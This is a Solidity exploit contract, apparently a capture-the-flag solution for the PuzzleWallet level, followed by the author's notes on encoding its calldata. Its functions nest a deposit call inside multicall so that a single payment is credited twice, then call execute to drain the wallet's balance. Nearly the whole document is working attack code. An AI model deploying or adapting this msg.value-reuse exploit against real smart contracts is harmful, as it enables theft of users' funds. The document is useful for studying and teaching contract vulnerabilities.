// Assume PuzzleWallet is in the same file

contract FundMe {

    address payable owner;
    address payable puzzle = 0x84755Cd0D12eC85bf19743063493365f411233e5; // my instance

    constructor() public {owner = msg.sender;}

    receive() external payable {}

    function getMyMoney() public {
        owner.transfer(address(this).balance);
    }

    function getMyBalance() public view returns (uint256) { return address(this).balance; }

    function maliciousMultiCallDeposit() public payable {
        PuzzleWallet _puzz = PuzzleWallet(puzzle);
        bytes[] memory args = new bytes[](2);
        bytes memory one = hex"d0e30db0"; // selector of 'deposit'
        // Calling deposit a second time through calling multicall a second time. So "0x<multicall_selector><bytes array of one item containing the call to deposit>"
        bytes memory two = hex"ac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000";
        args[0] = one;
        args[1] = two;
        _puzz.multicall{value: msg.value}(args);
    }

    function maliciousExecute(uint256 _value) public {
        // (address to, uint256 value, bytes calldata data)
        PuzzleWallet _puzz = PuzzleWallet(puzzle);
        _puzz.execute(address(this), _value, hex"");
    }
}

// I later did this entirely as EOA contract interactions. The whole reason I did it via contract at first was because, when I tried to do it via EOA, the 
// execute call was failing for some unknown reason. I (incorrectly) surmised that EOAs couldn't receive `call`s. Then it was a massive struggle getting the 
// arguments formatted for the malicious contract calls. Very little out there that I could find that showed how to set `bytes` values, and I settled on 
// `hex"<something>"` Getting the empty calldata was itself a tremendous pain in the ass. `""` didn't work, I had to specifically `hex""`.
